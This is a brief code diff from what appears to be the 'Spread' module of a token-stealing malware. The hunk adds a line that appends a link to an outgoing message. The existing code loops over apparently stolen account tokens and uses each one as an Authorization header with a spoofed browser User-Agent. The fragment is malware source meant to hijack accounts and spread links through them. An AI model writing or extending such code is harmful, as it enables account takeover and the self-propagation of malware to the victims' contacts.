@@ -2,6 +2,7 @@ class Spread:
 
     def __init__(self):
         self.message = ""
+        self.message += f"\n{self._link()}"
         try:
             for token in dtokens:
                 self.give_me_head = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11", "Authorization": token}
